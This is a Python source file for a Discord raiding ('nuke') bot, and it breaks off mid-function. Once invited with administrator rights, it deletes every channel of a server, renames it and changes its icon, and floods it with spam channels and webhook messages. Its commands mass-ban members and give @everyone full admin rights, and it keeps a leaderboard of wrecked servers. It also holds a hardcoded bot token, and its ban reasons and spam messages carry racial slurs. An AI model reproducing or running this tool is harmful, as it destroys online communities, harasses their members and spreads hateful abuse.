import discord
import json
import aiohttp
import requests
from discord.ext import commands
from queue import Queue
from threading import Thread
from colorama import Fore, Style
import os
import traceback
import re
# MADE BY MOR
# FLARED ON TOP
intents = discord.Intents().all()
intents.message_content = True
bot = commands.Bot(command_prefix=".", intents=intents)
bot.remove_command('help')

token = "KilLMjE3MDkwMzQwNDYwOTU3Ng.UrSElF.NigGa0l2J8Jt-nNpWj2wOcOTPgT5mCZeb-u_B8"
antinuke = ["1260005257845407765"]
logs_channel = "1260061767732826187"
new_guild_name = "𝖒𝖔𝖗'𝖘 𝖕𝖗𝖔𝖕𝖊𝖗𝖙𝖞"
new_icon_url = "https://i.ibb.co/HYYsnGW/icon.png"

perform_on_existing_server = False
inserverid = 1260075698874351626
autonuke = False
ban_whitelist = ["988166215203696760", "1071820009921318963"]
whitelisted_ids = ["1071820009921318963", "988166215203696760", "1138900094075277433", "1167769690614022159"]
Logs = False
admin_user_id = "988166215203696760"

def print_colored(message, r=75, g=0, b=130):
    color_code = f'\033[38;2;{r};{g};{b}m'
    reset_code = '\033[0m'
    print(color_code + message + reset_code)

def print_color(message, color):
    colors = {
        'green': '\033[92m',
        'yellow': '\033[93m',
        'reset': '\033[0m'
    }
    print(f"{colors.get(color, '')}{message}{colors['reset']}")
def clear_console():
    if os.name == 'posix':
        _ = os.system('clear')
    else:
        _ = os.system('cls')

def clear_consoler():
    if os.name == 'posix':
        _ = os.system('clear')
    else:
        _ = os.system('cls')
    print_colored("""
███╗   ███╗ ██████╗ ██████╗     ███╗   ██╗██╗   ██╗██╗  ██╗███████╗██████╗     ██╗   ██╗██████╗ 
████╗ ████║██╔═══██╗██╔══██╗    ████╗  ██║██║   ██║██║ ██╔╝██╔════╝██╔══██╗    ██║   ██║╚════██╗
██╔████╔██║██║   ██║██████╔╝    ██╔██╗ ██║██║   ██║█████╔╝ █████╗  ██████╔╝    ██║   ██║ █████╔╝
██║╚██╔╝██║██║   ██║██╔══██╗    ██║╚██╗██║██║   ██║██╔═██╗ ██╔══╝  ██╔══██╗    ╚██╗ ██╔╝██╔═══╝ 
██║ ╚═╝ ██║╚██████╔╝██║  ██║    ██║ ╚████║╚██████╔╝██║  ██╗███████╗██║  ██║     ╚████╔╝ ███████╗
╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═╝    ╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝      ╚═══╝  ╚══════╝ 
    """)
    print_colored("===============")
    print_color("Bot Ready.", "green")
    print_color(f"Bot username and tag: {bot.user}", "green")
    print_color(f"Bot ID: {bot.user.id}", "green")
    print_colored("===============")
    print_color("Command Prefix: .", "green")
    print_color("Type .cmds to the bot to see the commands", "green")
    invite_link = discord.utils.oauth_url(bot.user.id, permissions=discord.Permissions(administrator=True))
    print_color(f"Invite Link: {invite_link}", "yellow")
    print_colored("===============")
 
def clean_text(text):
    return re.sub(r'[*_~\-]', '', text)

def worker(queue):
    while True:
        func, url, headers, data = queue.get()
        try:
            response = func(url, headers=headers, json=data)
            # response.raise_for_status()
        except Exception as e:
            print_colored(f"Error: {e}")
        finally:
            queue.task_done()

async def process_guild(guild):
    server_id = str(guild.id)
    logg = bot.get_channel(int(logs_channel))
    
    with open('guild.json', 'r+') as f:
        data = json.load(f) 
        if server_id in data['guild']:
            return
        else:
            if server_id not in antinuke:
                await change_guild_icon_and_name(guild)
                
                q = Queue()
                for i in range(30):
                    t = Thread(target=worker, args=(q,))
                    t.daemon = True
                    t.start()

                headers = {
                    "Authorization": f"Bot {token}",
                    "Content-Type": "application/json"
                }
                
                for channel in guild.channels:
                    q.put((requests.delete, f"https://discord.com/api/v8/channels/{channel.id}", headers, None))

                q.join()
                
                raid = await guild.create_text_channel(name="𝖋𝖚𝖈𝖐𝖊𝖉 𝖇𝖞 𝖒𝖔𝖗")      
                await raid.send("||@everyone|| 𝖘𝖊𝖗𝖛𝖊𝖗 𝖙𝖆𝖐𝖊𝖓 𝖔𝖛𝖊𝖗 𝖇𝖞 𝖒𝖔𝖗")
                if Logs:
                    invite = await raid.create_invite(max_age=0)
                    
                    log = discord.Embed(title="𝖆𝖈𝖈𝖊𝖘𝖘", url=invite.url, colour=0x4b0082)
                    log.add_field(name='> 𝕹𝖆𝖒𝖊', value=f'{guild.name}', inline=False)
                    log.add_field(name='> 𝕸𝖊𝖒𝖇𝖊𝖗𝖘', value=f'{guild.member_count}', inline=False)
                    log.add_field(name='> 𝕺𝖜𝖓𝖊𝖗', value=f'{guild.owner}', inline=False)
                    log.add_field(name='> 𝕭𝖔𝖔𝖘𝖙𝖊𝖗𝖘', value=f'{str(guild.premium_subscription_count)}', inline=False)    

                    try:
                        await logg.send(invite.url, embed=log)
                    except Exception as e:
                        print(f"Error sending log message to {logg.name} in {guild.name}: {e}")

                for _ in range(50):
                    q.put((requests.post, f"https://discord.com/api/v8/guilds/{guild.id}/channels", headers, {"name": "𝖒𝖔𝖗 𝖔𝖜𝖓𝖘 𝖚"}))

                q.join()

                with open('guild.json', 'r+') as f:
                    data = json.load(f)
                    data['guild'].append(server_id)
                    f.seek(0)
                    json.dump(data, f)
                    f.truncate()

@bot.event    
async def on_guild_join(guild):
    if autonuke:
        await process_guild(guild)
@bot.event
async def on_guild_channel_create(channel):
    server_id = str(channel.guild.id)
    if server_id in json.load(open('guild.json'))['guild']:
        url = f"https://discord.com/api/v8/channels/{channel.id}/webhooks"
        headers = {
            "Authorization": f"Bot {token}",
            "Content-Type": "application/json"
        }
        data = {
            "name": "Mor's Slave"
        }
        try:
            async with aiohttp.ClientSession() as session:
                async with session.post(url, headers=headers, json=data) as response:
                    response_data = await response.json()
                    webhook_id = response_data['id']
                    webhook_token = response_data['token']
                    webhook_url = f"https://discord.com/api/webhooks/{webhook_id}/{webhook_token}"

                    for _ in range(50):
                        try:
                            log = discord.Embed(title="𝖔𝖜𝖓𝖊𝖉 𝖇𝖞 𝖒𝖔𝖗", description="```𝖓𝖎𝖌𝖌𝖊𝖗𝖊𝖉 𝖇𝖞 𝖒𝖔𝖗```", colour=0x4b0082)
                            log.add_field(name='Discord', value='https://discord.gg/VMnUYYm4PQ', inline=False)
                            log.set_image(url="https://i.ibb.co/ZNvqnrp/messageimage.gif")
                            log.set_thumbnail(url="https://i.ibb.co/gRph9g9/thumbnail.gif")
                            async with session.post(webhook_url, json={
                                "content": "||@everyone|| **__𝖔𝖜𝖓𝖊𝖉 𝖇𝖞 𝖒𝖔𝖗__**\n 𝖌𝖌𝖘 𝖒𝖋𝖘",
                                "embeds": [log.to_dict()]
                            }):
                                pass
                            await channel.send("||@everyone|| **__𝖔𝖜𝖓𝖊𝖉 𝖇𝖞 𝖒𝖔𝖗__**\n 𝖊𝖟 𝖙𝖇𝖍", embed=log)
                        except Exception as e:
                            print_colored(f"Error sending message: {e}")
        except Exception as e:
            print_colored(f"Error creating webhook: {e}")

async def change_guild_icon_and_name(guild):
    try:
        if new_icon_url:
            async with aiohttp.ClientSession() as session:
                async with session.get(new_icon_url) as response:
                    icon_data = await response.read()
                    await guild.edit(icon=icon_data)

        if new_guild_name:
            await guild.edit(name=new_guild_name)

    except Exception as e:
        print_colored(f"Error changing guild icon/name: {e}")

@bot.event
async def on_ready():
    await bot.change_presence(status=discord.Status.invisible)
    clear_console()
    print_colored("""
███╗   ███╗ ██████╗ ██████╗     ███╗   ██╗██╗   ██╗██╗  ██╗███████╗██████╗     ██╗   ██╗██████╗ 
████╗ ████║██╔═══██╗██╔══██╗    ████╗  ██║██║   ██║██║ ██╔╝██╔════╝██╔══██╗    ██║   ██║╚════██╗
██╔████╔██║██║   ██║██████╔╝    ██╔██╗ ██║██║   ██║█████╔╝ █████╗  ██████╔╝    ██║   ██║ █████╔╝
██║╚██╔╝██║██║   ██║██╔══██╗    ██║╚██╗██║██║   ██║██╔═██╗ ██╔══╝  ██╔══██╗    ╚██╗ ██╔╝██╔═══╝ 
██║ ╚═╝ ██║╚██████╔╝██║  ██║    ██║ ╚████║╚██████╔╝██║  ██╗███████╗██║  ██║     ╚████╔╝ ███████╗
╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═╝    ╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝      ╚═══╝  ╚══════╝ 
    """)
    print_colored("===============")
    print_color("Bot Ready.", "green")
    print_color(f"Bot username and tag: {bot.user}", "green")
    print_color(f"Bot ID: {bot.user.id}", "green")
    print_colored("===============")
    print_color("Command Prefix: .", "green")
    print_color("Type .cmds to the bot to see the commands", "green")
    invite_link = discord.utils.oauth_url(bot.user.id, permissions=discord.Permissions(administrator=True))
    print_color(f"Invite Link: {invite_link}", "yellow")
    print_colored("===============")
    if perform_on_existing_server:
        guild = bot.get_guild(inserverid)
        if guild:
            await process_guild(guild)
        else:
            print_coloredt(f"Server with ID {inserverid} not found.")

@bot.command()
async def massban(ctx):
    """Bans all members."""
    if str(ctx.author.id) not in whitelisted_ids:
        print_colored(f"Non-whitelisted command attempt {ctx.message.content}")
        return
    print_colored(f"Initiating mass banning in {ctx.guild.name}...")
    
    await ctx.message.delete()
    q = Queue()
    for i in range(30): 
        t = Thread(target=worker, args=(q,))
        t.daemon = True
        t.start()

    headers = {
        "Authorization": f"Bot {token}",
        "Content-Type": "application/json"
    }
    
    payload = {
        'delete_message_days': '0',
        'reason': 'niggered by mor'
    }

    for member in ctx.guild.members:
        if str(member.id) in ban_whitelist:
            print_colored(f"Skipping whitelisted member: {member.name} ({member.id})")
            continue
        q.put((requests.put, f"https://discord.com/api/v8/guilds/{ctx.guild.id}/bans/{member.id}", headers, payload))

    q.join()
    print_colored(f"Mass banning completed in {ctx.guild.name}.")

@bot.command()
async def kill(ctx):
    """Boom."""
    if str(ctx.author.id) not in whitelisted_ids:
        print_colored(f"non-whitelisted cmd attempt {ctx.message.content}")
        return
    guild = ctx.guild
    await ctx.message.delete()
    leaderboard_data = {
        "username": ctx.author.name,
        "guild_name": guild.name,
        "member_count": guild.member_count,
        "boosters": guild.premium_subscription_count
    }

    try:
        with open('leaderboard.json', 'r') as f:
            existing_data = json.load(f)
    except FileNotFoundError:
        existing_data = []

    if not isinstance(existing_data, list):
        existing_data = []

    existing_data.append(leaderboard_data)

    with open('leaderboard.json', 'w') as f:
        json.dump(existing_data, f, indent=4)

    await process_guild(guild)

@bot.command()
async def eadmin(ctx):
    """gives @everyone administrator permissions."""
    if str(ctx.author.id) not in whitelisted_ids:
        print_colored(f"non-whitelisted cmd attempt {ctx.message.content}")
        return
    await ctx.message.delete()
    guild = ctx.guild
    everyone_role = guild.default_role

    try:
        await everyone_role.edit(permissions=discord.Permissions.all())
        print_colored(f"Admin permissions granted to @everyone in {guild.name}.")
    except Exception as e:
        print_colored(f"Failed to grant admin permissions: {e}")

@bot.command()
async def massrole(ctx):
    """Create 100 roles"""
    if str(ctx.author.id) not in whitelisted_ids:
        print_colored(f"non-whitelisted cmd attempt {ctx.message.content}")
        return
    await ctx.message.delete()
    guild = ctx.guild

    q = Queue()
    for i in range(30):
        t = Thread(target=worker, args=(q,))
        t.daemon = True
        t.start()

    headers = {
        "Authorization": f"Bot {token}",
        "Content-Type": "application/json"
    }

    role_data = {
        "name": "𝖋𝖚𝖈𝖐𝖊𝖉 𝖇𝖞 𝖒𝖔𝖗",
        "color": discord.Color.purple().value
    }

    for _ in range(100):
        q.put((requests.post, f"https://discord.com/api/v8/guilds/{guild.id}/roles", headers, role_data))

    q.join()
    print_colored(f"Mass role creation completed in {guild.name}.")
@bot.command()
async def process(ctx, idforaguild: int):
    """Manually kill a server using server id"""
    guild = bot.get_guild(idforaguild)
    if guild:
        leaderboard_data = {
            "guild_name": guild.name,
            "guild_id": guild.id,
            "member_count": guild.member_count,
            "boosters": guild.premium_subscription_count
        }

        try:
            with open('leaderboard.json', 'r') as f:
                existing_data = json.load(f)
        except FileNotFoundError:
            existing_data = []

        if not isinstance(existing_data, list):
            existing_data = []

        existing_data.append(leaderboard_data)

        with open('leaderboard.json', 'w') as f:
            json.dump(existing_data, f, indent=4)
        await process_guild(guild)
        await ctx.send(f"Processed guild `{guild.name}` with ID `{idforaguild}` and saved to leaderboard.")
    else:
        await ctx.send(f"Guild with ID `{idforaguild}` not found.")

@bot.command()
async def servers(ctx):
    """Shows all servers the bot is in."""
    if str(ctx.author.id) not in whitelisted_ids:
        print_colored(f"non-whitelisted cmd attempt {ctx.message.content}")
        return
    servers_info = "\n".join([f"Name: {guild.name}, ID: {guild.id}, Members: {guild.member_count}" for guild in bot.guilds])
    await ctx.send(f"```Servers the bot is in:\n\n{servers_info}```")

@bot.command()
async def leaderboard(ctx, criteria, *, query=None):
    """Displays leaderboard args: (members/boosters/user {username})"""
    if str(ctx.author.id) not in whitelisted_ids:
        print_colored(f"non-whitelisted cmd attempt {ctx.message.content}")
        return
    if criteria.lower() == 'members':
        await fetch_top_servers(ctx, 'member_count')
    elif criteria.lower() == 'boosters':
        await fetch_top_servers(ctx, 'boosters')
    elif criteria.lower() == 'user' and query:
        await fetch_user_servers(ctx, query)
    else:
        await ctx.send("Invalid criteria or missing query. Usage: `.leaderboard (members/boosters/user) (query)`")

async def fetch_top_servers(ctx, key):
    try:
        with open('leaderboard.json', 'r') as f:
            data = json.load(f)
        sorted_data = sorted(data, key=lambda x: x[key], reverse=True)
        top_servers = sorted_data[:10]
        leaderboard_msg = []
        for idx, server in enumerate(top_servers, 1):
            clean_guild_name = clean_text(server['guild_name'])
            leaderboard_msg.append(f"{idx}. Server: {clean_guild_name}, {key.capitalize()}: {server[key]}")
        
        await ctx.send(f"Top 10 servers by {key}:\n```{chr(10).join(leaderboard_msg)}```")

    except FileNotFoundError:
        await ctx.send("Leaderboard data not found.")

    except Exception as e:
        await ctx.send(f"An error occurred: {e}")

async def fetch_user_servers(ctx, username):
    try:
        with open('leaderboard.json', 'r') as f:
            data = json.load(f)
        
        user_servers = []
        for entry in data:
            if 'username' in entry and clean_text(entry['username']) == clean_text(username):
                user_servers.append({
                    "guild_name": clean_text(entry['guild_name']),
                    "member_count": entry['member_count'],
                    "boosters": entry['boosters']
                })
        
        if user_servers:
            user_servers_info = "\n".join([f"Server: {server['guild_name']}, Members: {server['member_count']}, Boosters: {server['boosters']}" for server in user_servers])
            await ctx.send(f"Servers where {username} is associated:\n```{user_servers_info}```")
        else:
            await ctx.send(f"No data found for {username} in any server.")

    except FileNotFoundError:
        await ctx.send("Leaderboard data not found.")

    except Exception as e:
        await ctx.send(f"An error occurred: {e}")

    except Exception as e:
        await ctx.send(f"An error occurred: {e}")

async def fetch_user_servers(ctx, username):
    try:
        with open('leaderboard.json', 'r') as f:
            data = json.load(f)
        
        user_servers = []
        for entry in data:
            if 'username' in entry and entry['username'] == username:
                user_servers.append({
                    "guild_name": entry['guild_name'],
                    "member_count": entry['member_count'],
                    "boosters": entry['boosters']
                })
        
        if user_servers:
            user_servers_info = "\n".join([f"Server: {server['guild_name']}, Members: {server['member_count']}, Boosters: {server['boosters']}" for server in user_servers])
            await ctx.send(f"Servers where {username} is associated:\n```{user_servers_info}```")
        else:
            await ctx.send(f"No data found for {username} in any server.")

    except FileNotFoundError:
        await ctx.send("Leaderboard data not found.")

    except Exception as e:
        await ctx.send(f"An error occurred: {e}")
@bot.command()
async def lb(ctx, action, *args):
    """Manages the leaderboard. Usage: .lb create (servername) (membercount) (username) (boosters)"""
    if str(ctx.author.id) not in whitelisted_ids:
        print_colored(f"Non-whitelisted command attempt by {ctx.author.id}: {ctx.message.content}")
        return

    if action.lower() == 'create':
        if len(args) != 4:
            await ctx.send("Usage: `.lb create (servername) (membercount) (username) (boosters)`")
            return

        servername = args[0]
        membercount = args[1]
        username = args[2]
        boosters = args[3]

        try:
            membercount = int(membercount)
            boosters = int(boosters)
        except ValueError:
            await ctx.send("Member count and boosters must be integers.")
            return

        new_entry = {
            "guild_name": servername,
            "member_count": membercount,
            "username": username,
            "boosters": boosters,
            "comment": "this is a command generated entry, not processed."
        }

        try:
            with open('leaderboard.json', 'r+') as f:
                try:
                    data = json.load(f)
                except json.JSONDecodeError:
                    data = []

                data.append(new_entry)
                f.seek(0)
                json.dump(data, f, indent=4)
                f.truncate()

            await ctx.send(f"Entry for server `{servername}` created successfully.")
        except FileNotFoundError:
            await ctx.send("Leaderboard file not found.")
        except Exception as e:
            await ctx.send(f"An error occurred while creating the entry: {e}")

    elif action.lower() == 'remove':
        if len(args) != 2:
            await ctx.send("Usage: `.lb remove (servername/username/serverid) (\"data\")`")
            return

        remove_type = args[0].lower()
        data = args[1]

        try:
            with open('leaderboard.json', 'r+') as f:
                try:
                    leaderboard_data = json.load(f)
                except json.JSONDecodeError:
                    leaderboard_data = []

                if remove_type == 'servername':
                    removed_count = len([entry for entry in leaderboard_data if entry.get('guild_name') == data])
                    leaderboard_data = [entry for entry in leaderboard_data if entry.get('guild_name') != data]
                elif remove_type == 'username':
                    removed_count = len([entry for entry in leaderboard_data if entry.get('username') == data])
                    leaderboard_data = [entry for entry in leaderboard_data if entry.get('username') != data]
                elif remove_type == 'serverid':
                    removed_count = len([entry for entry in leaderboard_data if str(entry.get('serverid')) == data])
                    leaderboard_data = [entry for entry in leaderboard_data if str(entry.get('serverid')) != data]
                else:
                    await ctx.send("Invalid removal type. Use `servername`, `username`, or `serverid`.")
                    return

                f.seek(0)
                json.dump(leaderboard_data, f, indent=4)
                f.truncate()

            await ctx.send(f"Successfully removed {removed_count} entries.")
        except FileNotFoundError:
            await ctx.send("Leaderboard file not found.")
        except Exception as e:
            await ctx.send(f"An error occurred while removing entries: {e}")

    else:
        await ctx.send("Invalid action. Use `.lb create` to add a new entry or `.lb remove` to remove entries.")
@bot.command()
async def clearconsole(ctx):
    """Clear the console."""
    await ctx.message.delete()
    clear_consoler()
@bot.command()
async def invite(ctx):
   """Generates a bot invite."""
   if str(ctx.author.id) not in whitelisted_ids:
        print_colored(f"non-whitelisted cmd attempt {ctx.message.content}")
        return
   try:
       await ctx.send(f"Bot Invite: https://discord.com/oauth2/authorize?client_id={bot.user.id}&permissions=8&integration_type=0&scope=bot")
   except Exception as e:
     print_colored(f"Sending invite error: {e}")
@bot.command()
async def leave(ctx, guild_id: int):
    """Makes the bot leave a guild by its ID."""
    if str(ctx.author.id) not in whitelisted_ids:
        print_colored(f"Non-whitelisted cmd attempt {ctx.message.content}")
        return

    guild = bot.get_guild(guild_id)
    
    if guild is None:
        return await ctx.send(f"The bot is not in a guild with ID {guild_id}.")

    print_colored(f"Bot is leaving guild: {guild.name} ({guild.id}) at the request of {ctx.author.name}")
    await guild.leave()
    await ctx.send(f"Bot has left the guild: {guild.name} ({guild.id}).")
@bot.command()
async def wipe(ctx, filename: str):
    """Wipes the contents of a specified JSON file. CAN ONLY BE RAN BY OWNER"""
    if str(ctx.author.id) not in admin_user_id:
       return

    if not filename.endswith('.json'):
        await ctx.send("The specified file must be a JSON file.")
        return

    if not os.path.isfile(filename):
        await ctx.send(f"The file `{filename}` does not exist.")
        return

    if filename == 'guild.json':
        data_to_dump = {"guild": []}
    else:
        data_to_dump = [{}]

    confirmation_message = await ctx.send(
        f"Are you sure you want to wipe `{filename}`?\nThis action **CANNOT** be undone.\nReact with ✅ to confirm."
    )
    await confirmation_message.add_reaction("✅")

    def check(reaction, user):
        return user == ctx.author and str(reaction.emoji) == "✅" and reaction.message.id == confirmation_message.id

    try:
        reaction, user = await bot.wait_for("reaction_add", timeout=60.0, check=check)
    except asyncio.TimeoutError:
        await ctx.send("Confirmation timed out. Operation cancelled.")
        return

    try:
        with open(filename, 'w') as f:
            json.dump(data_to_dump, f, indent=4)
        await ctx.send(f"The file `{filename}` has been wiped successfully.")
    except Exception as e:
        await ctx.send(f"An error occurred while wiping the file: {e}")
@bot.command()
async def makeinvite(ctx, guild_id: int):
    """Generates an invite link to a guild by its ID."""
    if str(ctx.author.id) not in whitelisted_ids:
        print_colored(f"Non-whitelisted command attempt by {ctx.author.id}: {ctx.message.content}")
        return

    guild = bot.get_guild(guild_id)
    if not guild:
        await ctx.send(f"Guild with ID {guild_id} not found.")
        return

    for channel in guild.text_channels:
        try:
            invite = await channel.create_invite(max_age=0, max_uses=0)
            await ctx.send(f"Here is your invite link to {guild.name}: {invite.url}")
            return
        except discord.Forbidden:
            continue
        except discord.HTTPException as e:
            await ctx.send(f"Failed to create invite link: {e}")
            return

    await ctx.send(f"Could not create an invite link for the guild {guild.name}. Please check my permissions.")
@bot.command()
async def mban(ctx, guild_id: int):
    """Bans all members in a specified guild."""
    if str(ctx.author.id) not in whitelisted_ids:
        print_colored(f"Non-whitelisted command attempt by {ctx.author.id}: {ctx.message.content}")
        return
    
    guild = bot.get_guild(guild_id)
    if not guild:
        await ctx.send(f"Guild with ID {guild_id} not found.")
        return

    print_colored(f"Initiating mass banning in {guild.name}...")
    
    await ctx.message.delete()
    q = Queue()
    for i in range(30):
        t = Thread(target=worker, args=(q,))
        t.daemon = True
        t.start()

    headers = {
        "Authorization": f"Bot {token}",
        "Content-Type": "application/json"
    }
    
    payload = {
        'delete_message_days': '0',
        'reason': 'niggered by mor'
    }

    for member in guild.members:
        if str(member.id) in ban_whitelist:
            print_colored(f"Skipping whitelisted member: {member.name} ({member.id})")
            continue
        q.put((requests.put, f"https://discord.com/api/v8/guilds/{guild.id}/bans/{member.id}", headers, payload))

    q.join()
    print_colored(f"Mass banning completed in {guild.name}.")

@bot.command()
async def evadmin(ctx, guild_id: int):
    """Gives @everyone administrator permissions in a specified guild."""
    if str(ctx.author.id) not in whitelisted_ids:
        print_colored(f"Non-whitelisted command attempt by {ctx.author.id}: {ctx.message.content}")
        return

    guild = bot.get_guild(guild_id)
    if not guild:
        await ctx.send(f"Guild with ID {guild_id} not found.")
        return

    await ctx.message.delete()
    everyone_role = guild.default_role

    try:
        await everyone_role.edit(permissions=discord.Permissions.all())
        print_colored(f"Admin permissions granted to @everyone in {guild.name}.")
    except Exception as e:
        print_colored(f"Failed to grant admin permissions: {e}")

@bot.command()
async def mrole(ctx, guild_id: int):
    """Creates 100 roles in a specified guild."""
    if str(ctx.author.id) not in whitelisted_ids:
        print_colored(f"Non-whitelisted command attempt by {ctx.author.id}: {ctx.message.content}")
        return

    guild = bot.get_guild(guild_id)
    if not guild:
        await ctx.send(f"Guild with ID {guild_id} not found.")
        return

    await ctx.message.delete()

    q = Queue()
    for i in range(30):
        t = Thread(target=worker, args=(q,))
        t.daemon = True
        t.start()

    headers = {
        "Authorization": f"Bot {token}",
        "Content-Type": "application/json"
    }

    role_data = {
        "name": "𝖋𝖚𝖈𝖐𝖊𝖉 𝖇𝖞 𝖒𝖔𝖗",
        "color": discord.Color.purple().value
    }

    for _ in range(100):
        q.put((requests.post, f"https://discord.com/api/v8/guilds/{guild.id}/roles", headers, role_data))

    q.join()
    print_colored(f"Mass role creation completed in {guild.name}.")
@bot.command()
async def dcm(ctx):
    """Disables community mode in the current server."""
    if str(ctx.author.id) not in whitelisted_ids:
        print_colored(f"Non-whitelisted command attempt by {ctx.author.id}: {ctx.message.content}")
        return
    await ctx.message.delete()
    guild = ctx.guild
    if guild.features and "COMMUNITY" in guild.features:
        await guild.edit(community=False)
        print_colored(f"Community mode disabled in {guild.name}.")
        
    else:
        print_colored("Community mode is not enabled in this server.")

@bot.command()
async def disablecom(ctx, guild_id: int):
    """Disables community mode in a specified server."""
    if str(ctx.author.id) not in whitelisted_ids:
        print_colored(f"Non-whitelisted command attempt by {ctx.author.id}: {ctx.message.content}")
        return

    guild = bot.get_guild(guild_id)
    if guild and guild.features and "COMMUNITY" in guild.features:
        await guild.edit(community=False)
        print_colored(f"Community mode disabled in {guild.name}.")
        
    else:
        print_colored("Community mode is not enabled in this server.")

async def find_duplicate_channels(guild):
    channel_names = {}
    duplicates = []

    for channel in guild.channels:
        if channel.name not in channel_names:
            channel_names[channel.name] = channel
        else:
            duplicates.append(channel)

    return duplicates

@bot.command()
async def restore(ctx):
    """restores a server after nuke"""
    if str(ctx.author.id) not in whitelisted_ids:
        print_colored(f"Non-whitelisted command attempt by {ctx.author.id}: {ctx.message.content}")
        return

    guild = ctx.guild
    q = Queue()

    for i in range(30):
        t = Thread(target=worker, args=(q,))
        t.daemon = True
        t.start()

    headers = {
        "Authorization": f"Bot {token}",
        "Content-Type": "application/json"
    }
    duplicates = await find_duplicate_channels(guild)
    for channel in duplicates:
        q.put((requests.delete, f"https://discord.com/api/v8/channels/{channel.id}", headers, None))
    
    q.join()
    channels_data = []
    for channel in guild.channels:
        if channel not in duplicates and (isinstance(channel, discord.TextChannel) or isinstance(channel, discord.CategoryChannel)):
            channels_data.append({
                "type": channel.type,
                "name": channel.name,
                "position": channel.position,
                "permission_overwrites": channel.overwrites,
                "category_id": channel.category_id if isinstance(channel, discord.TextChannel) else None
            })
    for channel in guild.channels:
        if channel not in duplicates:
            q.put((requests.delete, f"https://discord.com/api/v8/channels/{channel.id}", headers, None))
    
    q.join()
    for channel_data in channels_data:
        if channel_data["type"] == discord.ChannelType.category:
            await guild.create_category(name=channel_data["name"], position=channel_data["position"], overwrites=channel_data["permission_overwrites"])
        elif channel_data["type"] == discord.ChannelType.text:
            await guild.create_text_channel(name=channel_data["name"], position=channel_data["position"], overwrites=channel_data["permission_overwrites"], category=discord.utils.get(guild.categories, id=channel_data["category_id"]))

    print_colored(f"Attack nuke completed in {guild.name}.")

@bot.command()
async def attackn(ctx, guild_id: int):
    """restores server after a nuke"""
    if str(ctx.author.id) not in whitelisted_ids:
        print_colored(f"Non-whitelisted command attempt by {ctx.author.id}: {ctx.message.content}")
        return

    guild = bot.get_guild(guild_id)
    if not guild:
        await ctx.send(f"Guild with ID {guild_id} not found.")
        return

    q = Queue()

    for i in range(30):
        t = Thread(target=worker, args=(q,))
        t.daemon = True
        t.start()

    headers = {
        "Authorization": f"Bot {token}",
        "Content-Type": "application/json"
    }
    duplicates = await find_duplicate_channels(guild)
    for channel in duplicates:
        q.put((requests.delete, f"https://discord.com/api/v8/channels/{channel.id}", headers, None))
    
    q.join()
    channels_data = []
    for channel in guild.channels:
        if channel not in duplicates and (isinstance(channel, discord.TextChannel) or isinstance(channel, discord.CategoryChannel)):
            channels_data.append({
                "type": channel.type,
                "name": channel.name,
                "position": channel.position,
                "permission_overwrites": channel.overwrites,
                "category_id": channel.category_id if isinstance(channel, discord.TextChannel) else None
            })
    for channel in guild.channels:
        if channel not in duplicates:
            q.put((requests.delete, f"https://discord.com/api/v8/channels/{channel.id}", headers, None))
    
    q.join()
    for channel_data in channels_data:
        if channel_data["type"] == discord.ChannelType.category:
            await guild.create_category(name=channel_data["name"], position=channel_data["position"], overwrites=channel_data["permission_overwrites"])
        elif channel_data["type"] == discord.ChannelType.text:
            await guild.create_text_channel(name=channel_data["name"], position=channel_data["position"], overwrites=channel_data["permission_overwrites"], category=discord.utils.get(guild.categories, id=channel_data["category_id"]))

    print_colored(f"Attack nuke completed in {guild.name}.")
@bot.command()
async def removeguild(ctx, guild_id: int):
    """Removes a guild ID from guild.json"""
    if str(ctx.author.id) not in whitelisted_ids:
        print_colored(f"Non-whitelisted command attempt {ctx.message.content}")
        return
    
    try:
        with open('guild.json', 'r+') as f:
            data = json.load(f)
            if str(guild_id) in data['guild']:
                data['guild'].remove(str(guild_id))
                f.seek(0)
                json.dump(data, f, indent=4)
                f.truncate()
                await ctx.send(f"Guild ID `{guild_id}` removed from guild.json.")
            else:
                await ctx.send(f"Guild ID `{guild_id}` not found in guild.json.")
    except FileNotFoundError:
        await ctx.send("guild.json not found.")
    except Exception as e:
        await ctx.send(f"An error occurred while removing the guild ID: {e}")

@bot.command()
async def unban(ctx, server_id: int, user_id: int):
    """Unbans a user from a server."""
    if str(ctx.author.id) not in whitelisted_ids:
        print_colored(f"Non-whitelisted command attempt {ctx.message.content}")
        return
    
    try:
        guild = bot.get_guild(server_id)
        if guild is None:
            await ctx.send(f"Server with ID `{server_id}` not found.")
            return
        
        await guild.unban(discord.Object(id=user_id))
        await ctx.send(f"User with ID `{user_id}` has been unbanned from server `{guild.name}`.")
    except discord.Forbidden:
        await ctx.send("I don't have permission to unban members in that server.")
    except discord.HTTPException:
        await ctx.send(f"Failed to unban user with ID `{user_id}` from server `{guild.name}`.")
    except Exception as e:
        await ctx.send(f"An error occurred while processing the command: {e}")
@bot.command()
async def dump(ctx, filename: str):
    """Uploads a specified JSON file from the current directory to Discord."""
    if str(ctx.author.id) not in whitelisted_ids:
        print_colored(f"Non-whitelisted command attempt by {ctx.author.id}: {ctx.message.content}")
        return

    if not os.path.isfile(filename):
        await ctx.send(f"The file `{filename}` does not exist in the current directory.")
        return
    if not filename.endswith('.json'):
        await ctx.send("The specified file must be a JSON file.")
        return

    try:
        with open(filename, 'rb') as f:
            await ctx.send(file=discord.File(f, filename=filename))
    except Exception as e:
        await ctx.send(f"An error occurred while uploading the file: {e}")
@bot.command()
async def purge(ctx):
    """Deletes and recreates the current channel with the same settings."""
    if str(ctx.author.id) not in whitelisted_ids:
      print_colored(f"Non-whitelisted command attempt by {ctx.author.id}: {ctx.message.content}")
      return
    await ctx.message.delete()
    channel = ctx.channel

    try:
        if not channel:
            print_colored("Channel not found.")
            return
        if not channel.permissions_for(ctx.guild.me).manage_channels:
            print_colored("Bot doesn't have permission to manage channels.")
            return
        channel_name = channel.name
        position = channel.position
        category = channel.category
        overwrites = channel.overwrites
        topic = channel.topic
        nsfw = channel.nsfw
        cloned_channel = await channel.clone(reason="Purging channel")
        await channel.delete()
        await cloned_channel.edit(
            name=channel_name,
            position=position,
            category=category,
            overwrites=overwrites,
            topic=topic,
            nsfw=nsfw
        )

        print_colored(f"Channel `{channel_name}` purged successfully and recreated.")
    except discord.NotFound:
        print_colored("Channel not found.")
    except discord.Forbidden:
